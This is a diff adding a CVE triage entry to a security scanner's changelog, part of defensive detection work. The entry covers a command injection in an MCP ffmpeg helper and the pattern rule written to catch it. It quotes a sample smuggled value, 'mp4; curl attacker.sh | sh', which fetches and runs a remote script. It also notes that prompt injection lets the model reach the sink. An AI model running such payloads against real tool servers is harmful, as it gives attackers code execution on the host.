@@ -16,6 +16,25 @@ open.
 > issue. The per-CVE latency figures in the tables are **measurements recorded at
 > the time**, kept as dated facts, not a standing promise.
 
+## 2026-08-25: a tool handler, not a launcher
+
+The first CVE in a while whose surface is the *request path*. Every command-injection
+rule this project had inspected the configured server command — `AAK-MCP-002` and the
+`AAK-MCP-STDIO-CMD-INJ-*` family all read the launch line before a process exists. This
+one is what the server does with an argument the model supplied, after it is running.
+
+Worth recording alongside it: the defect class was already claimed. `AAK-TAINT-001` is
+titled "Tool parameter flows to shell command" and holds `ADV-INJECT-04`
+("Tool Param Shell Injection"). Its Python detection is real AST taint; its TS/JS
+detection is sink-only, firing on any `child_process` call in a file that mentions an
+MCP server, regardless of how the command was built. The new rule is the narrower TS
+claim — the command was *composed* at the process boundary inside a tool handler — and
+`AAK-TAINT-001` is suppressed on any line where it fires, so one defect is reported once.
+
+| CVE | Reference | AAK rule / disposition | Triaged |
+|---|---|---|---|
+| CVE-2026-78430 (`mcp-ffmpeg-helper` 0.1.0 / 0.1.1 / 0.2.1, CWE-77 + CWE-78, CVSS 3.1 5.3 / CVSS 4.0 1.9 - `handleToolCall` in `src/tools/handlers.ts` interpolates the `format` tool argument into a shell string, so a value such as `mp4; curl attacker.sh \| sh` is parsed by a shell and runs as a second command) | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-78430) · [upstream issue](https://github.com/sworddut/mcp-ffmpeg-helper/issues/6) | **In scope, rule shipped** `AAK-MCP-TOOL-ARG-OSCMD-001` (TOOL_POISONING, **CRITICAL**). Rated above its CVSS deliberately: 5.3 reflects `AV:L`, a local attacker — but in an agent pipeline the local caller is the model, so any upstream prompt injection reaches this sink with the server's privileges. That reasoning is in the rule description, not a code comment, so a reader of a SARIF report sees it. **Detection is a TypeScript/JavaScript source pattern, not taint**: it proves the command was composed at a process boundary (a template literal with `${...}`, a concatenation, or an explicit `shell: true`) inside a file that dispatches tool calls — it does *not* prove the interpolated value reached it from the arguments object. The repo's TS taint engine (`_ts_stdio_taint.py`, tree-sitter) could prove that, but it lives behind the optional `[taint]` extra, so a rule built on it would silently not fire for anyone who ran `pip install agent-audit-kit`. Pattern detection was chosen so the rule works in the default install. No version pin: upstream has published no fix (the advisory records the project was notified and has not responded), and `mcp-ffmpeg-helper` resolves on neither PyPI nor npm, so there is no artifact `_CANDIDATE_NAMES` would open. Positive and negative fixtures under `tests/fixtures/cves/cve-2026-78430-mcp-ffmpeg-helper/`; the negative one is the `execFile(bin, argv)` + allowlist shape the remediation asks for. (#633) | 2026-08-25 |
+
 ## 2026-08-24: two SiYuan advisories, and three reasons neither is reachable
 
 Both advisories are against SiYuan, both are fixed in v3.8.0, and neither ships a rule.
